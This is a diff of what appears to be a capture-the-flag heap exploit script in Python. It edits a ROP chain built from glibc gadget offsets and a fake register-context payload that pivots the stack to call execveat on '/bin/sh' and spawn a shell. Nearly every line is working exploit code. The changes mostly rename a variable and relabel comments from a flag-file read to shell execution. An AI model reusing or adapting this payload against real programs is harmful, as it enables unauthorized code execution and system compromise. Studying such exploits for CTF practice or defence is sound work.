@@ -87,11 +87,11 @@ def main():
 
     pop_rax_ret_addr = glibc.address + 0x047cf8
     pop_r10_ret_addr = glibc.address + 0x12bda5
-    syscall_ret_addr = glibc.address + 0x26bd4
+    syscall_addr     = glibc.address + 0x26bd4
 
-    rop_chain  = p64(pop_r10_ret_addr) + p64(0)
-    rop_chain += p64(pop_rax_ret_addr) + p64(322)
-    rop_chain += p64(syscall_ret_addr)
+    rop_chain  = p64(pop_r10_ret_addr) + p64(0)    # envp
+    rop_chain += p64(pop_rax_ret_addr) + p64(322)  # sys_execveat
+    rop_chain += p64(syscall_addr)
 
     payload  = p64(heap_base_addr + 0x1bc0)
     payload += b'A' * 16
@@ -103,15 +103,15 @@ def main():
     payload += p64(0)                          # <-- [rdx + 0x50] = r13
     payload += p64(0)                          # <-- [rdx + 0x58] = r14
     payload += p64(0)                          # <-- [rdx + 0x60] = r15
-    payload += p64(0)                          # <-- [rdx + 0x68] = rdi (ptr to flag path)
-    payload += p64(heap_base_addr + 0x1ba0)    # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
+    payload += p64(0)                          # <-- [rdx + 0x68] = rdi (dir_fd)
+    payload += p64(heap_base_addr + 0x1ba0)    # <-- [rdx + 0x70] = rsi (pointer to "/bin/sh")
     payload += p64(0)                          # <-- [rdx + 0x78] = rbp
     payload += p64(0)                          # <-- [rdx + 0x80] = rbx
-    payload += p64(0)                          # <-- [rdx + 0x88] = rdx
+    payload += p64(0)                          # <-- [rdx + 0x88] = rdx (argv)
     payload += b'A' * 8                        # padding
     payload += p64(0)                          # <-- [rdx + 0x98] = rcx
-    payload += p64(heap_base_addr + 0x1bc8 + len(payload) + 16) # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
-    payload += rop_chain                       # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
+    payload += p64(heap_base_addr + 0x1bc8 + len(payload) + 16) # <-- [rdx + 0xa0] = rsp, pointing to ROP chain 
+    payload += rop_chain                       # <-- [rdx + 0xa8] = rcx, will be pushed
 
     write(p, 0x18, b'/bin/sh\0')
     write(p, 0x18, p64(glibc.address + 0x150550))
